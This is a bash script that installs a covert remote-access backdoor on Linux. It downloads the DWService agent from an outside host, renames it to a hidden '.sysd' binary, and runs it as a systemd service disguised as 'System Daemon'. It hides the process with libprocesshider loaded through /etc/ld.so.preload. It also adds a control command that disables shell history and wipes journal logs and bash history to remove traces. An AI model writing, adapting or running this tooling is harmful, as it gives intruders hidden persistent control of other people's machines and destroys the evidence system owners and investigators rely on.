#!/bin/bash

echo "Script started at $(date '+%Y-%m-%d %H:%M:%S')"

set -e

ACTION=$1

AGENT_URL="https://site007.dwservice.net/app/agent/2/installer/dwagent.sh"
HIDDEN_DIR="/usr/local/.dwcore"
HIDDEN_BIN="${HIDDEN_DIR}/.sysd"
SERVICE_NAME="sysd"
PHIDER_SO="/usr/local/lib/libprocesshider.so"
PHIDER_PRELOAD="/etc/ld.so.preload"
HOTKEY_BIN="/usr/local/bin/dwagent_control"
OFFICIAL_AGENT_DIR="/usr/share/dwagent"

log() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

install_all() {
  log "[+] Starting dependency installation..."
  apt update -y
  apt install -y git curl build-essential linux-headers-$(uname -r)
  log "[\u2713] Dependencies installed or already present."

  log "[+] Preparing DWAgent installation..."
  mkdir -p "$HIDDEN_DIR"
  cd "$HIDDEN_DIR"
  log "[*] Downloading fresh DWAgent installer from $AGENT_URL..."

  RETRY_COUNT=0
  MAX_RETRIES=3
  SUCCESS=0
  while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
    RETRY_COUNT=$((RETRY_COUNT + 1))
    log "[*] Attempt $RETRY_COUNT of $MAX_RETRIES..."
    if wget --user-agent="Mozilla/5.0" --tries=1 --timeout=20 --show-progress -O dwagent.sh "$AGENT_URL"; then
      EXPECTED_SIZE=1476018
      ACTUAL_SIZE=$(ls -l dwagent.sh | awk '{print $5}')
      if [[ "$ACTUAL_SIZE" -ne "$EXPECTED_SIZE" ]]; then
        log "[\u2717] Size mismatch. Retrying..."
      else
        SUCCESS=1
        break
      fi
    else
      log "[\u2717] Download failed."
    fi
    sleep 5
  done

  if [ $SUCCESS -eq 0 ]; then
    log "[\u2717] Failed to download after $MAX_RETRIES attempts."
    exit 1
  fi

  chmod +x dwagent.sh

  if [[ -z "$DISPLAY" ]]; then
    log "[\u2717] No graphical display detected."
    exit 1
  fi

  log "[!] Launching DWAgent installer in 5 seconds..."
  sleep 5
  env DISPLAY="$DISPLAY" /bin/bash -c "cd $HIDDEN_DIR && ./dwagent.sh"

  for i in {1..60}; do
    AGENT_ORIG="/usr/share/dwagent/native/dwagent"
    if [[ -f "$AGENT_ORIG" ]]; then
      break
    fi
    sleep 2
  done

  if [[ ! -f "$AGENT_ORIG" ]]; then
    log "[\u2717] DWAgent installation not detected."
    exit 1
  fi

  systemctl stop dwagsvc 2>/dev/null || true
  systemctl disable dwagsvc 2>/dev/null || true
  pkill -f dwagent || true
  pkill -f dwagsvc || true

  mv "$AGENT_ORIG" "$HIDDEN_BIN"
  chmod +x "$HIDDEN_BIN"

  tee /etc/systemd/system/${SERVICE_NAME}.service >/dev/null <<EOF
[Unit]
Description=System Daemon
After=network.target

[Service]
Type=simple
ExecStart=$HIDDEN_BIN
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

  systemctl daemon-reload
  systemctl enable --now $SERVICE_NAME

  git clone https://github.com/gianlucaborello/libprocesshider /tmp/phider
  cd /tmp/phider
  sed -i 's/"process_to_filter"/".sysd"/' processhider.c
  make
  mv libprocesshider.so "$PHIDER_SO"
  grep -q "$PHIDER_SO" "$PHIDER_PRELOAD" || echo "$PHIDER_SO" >> "$PHIDER_PRELOAD"
  ldconfig
  rm -rf /tmp/phider

  tee "$HOTKEY_BIN" >/dev/null <<EOF
#!/bin/bash
export HISTFILE=/dev/null
set +o history
logger -t dwagent "Command script triggered with action: \$1"
case "\$1" in
  sta)
    systemctl start $SERVICE_NAME
    ;;
  sto)
    systemctl stop $SERVICE_NAME
    ;;
  clr)
    journalctl --vacuum-time=1s
    cat /dev/null > ~/.bash_history
    history -c
    ;;
  rmv)
    systemctl stop $SERVICE_NAME
    systemctl disable $SERVICE_NAME
    rm -f /etc/systemd/system/$SERVICE_NAME.service
    systemctl daemon-reload
    rm -rf "$HIDDEN_DIR"
    rm -rf "$OFFICIAL_AGENT_DIR"
    sed -i '\|$PHIDER_SO|d' "$PHIDER_PRELOAD"
    rm -f "$PHIDER_SO"
    rm -f "$HOTKEY_BIN"
    journalctl --vacuum-time=1s
    cat /dev/null > ~/.bash_history
    history -c
    ;;
  *)
    echo "Usage: \$0 {sta|sto|clr|rmv}"
    exit 1
    ;;
esac
EOF
  chmod +x "$HOTKEY_BIN"
  log "[\u2713] Setup complete. Use: sta | sto | clr | rmv"
}

uninstall_all() {
  echo "[!] Full uninstall in progress..."

  sed -i "\|$PHIDER_SO|d" "$PHIDER_PRELOAD"
  ldconfig
  rm -f "$PHIDER_SO"
  systemctl stop "$SERVICE_NAME" 2>/dev/null || true
  systemctl disable "$SERVICE_NAME" 2>/dev/null || true
  rm -f "/etc/systemd/system/$SERVICE_NAME.service"
  systemctl daemon-reload
  rm -rf "$HIDDEN_DIR"

  systemctl stop dwagsvc 2>/dev/null || true
  systemctl disable dwagsvc 2>/dev/null || true
  pkill -f dwagent || true
  pkill -f dwagsvc || true
  if [[ -f "$OFFICIAL_AGENT_DIR/uninstall.sh" ]]; then
    "$OFFICIAL_AGENT_DIR/uninstall.sh"
  else
    rm -rf "$OFFICIAL_AGENT_DIR"
  fi

  rm -f "$HOTKEY_BIN"
  journalctl --vacuum-time=1s
  cat /dev/null > ~/.bash_history
  history -c

  echo "[\u2713] All traces removed."
}

if [[ "$ACTION" == "install" ]]; then
  install_all
elif [[ "$ACTION" == "uninstall" ]]; then
  uninstall_all
else
  echo "Usage: $0 [install|uninstall]"
  exit 1
fi
